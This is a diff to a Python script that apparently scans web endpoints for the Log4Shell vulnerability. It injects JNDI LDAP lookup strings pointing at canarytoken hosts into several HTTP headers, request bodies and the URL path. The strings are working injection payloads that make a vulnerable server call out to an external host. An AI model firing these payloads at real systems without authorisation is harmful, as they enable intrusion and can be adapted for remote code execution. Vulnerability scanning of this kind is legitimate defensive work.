@@ -27,11 +27,15 @@ def check_post_parameter(method: str, identifier: str, url: str, parameters: lis
                 data=data,
                 headers={
                     'Content-Type': 'text/plain', 
-                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}"
+                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
                 },
                 verify=False
             )
-            print(r.status_code)
+            logging.info(f"Status code: {r.status_code} - POST")
+
         elif method == "GET":
             data = {}
             for parameter in parameters:
@@ -39,12 +43,51 @@ def check_post_parameter(method: str, identifier: str, url: str, parameters: lis
             r = requests.get(
                 url,
                 headers={
-                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}"
+                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
                 },
                 params=data,
                 verify=False
             )
-            print(r.status_code)
+            logging.info(f"Status code: {r.status_code} - GET")
+
+        elif method == "BOTH":
+            # Generate POST body without url-encode (probably can be prettier)
+            data = "{"
+            for parameter in parameters:
+                data += f"{parameter}=${{jndi:ldap://x{identifier}-{parameter}.L4J.{canarytoken}.canarytokens.com/a}}&"
+            data = data[:-1]
+            data += "}"
+
+            r = requests.post(
+                url,
+                data=data,
+                headers={
+                    'Content-Type': 'text/plain', 
+                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
+                },
+                verify=False
+            )
+            logging.info(f"Status code: {r.status_code} - POST")
+
+            r = requests.get(
+                f"{url}/${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
+                headers={
+                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
+                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
+                },
+                verify=False
+            )
+            logging.info(f"Status code: {r.status_code} - GET")
+
+
     except requests.exceptions.ConnectionError as e:
         logging.error(f"HTTP connection to {url} error: {e}")
 
@@ -64,9 +107,8 @@ def main():
                 method = row[2]
                 parameters = row[3].replace(" ", "").split(",") 
             except IndexError:
-                print("Filename should be in the following format:")
-                print("URL info, URL, POST or GET, query parameters")
-                return
+                logging.warning("Filename should be in the following format: URL info, URL, POST or GET, query parameters")
+                continue
 
             if url != "":
                 identifier = uuid.uuid4()
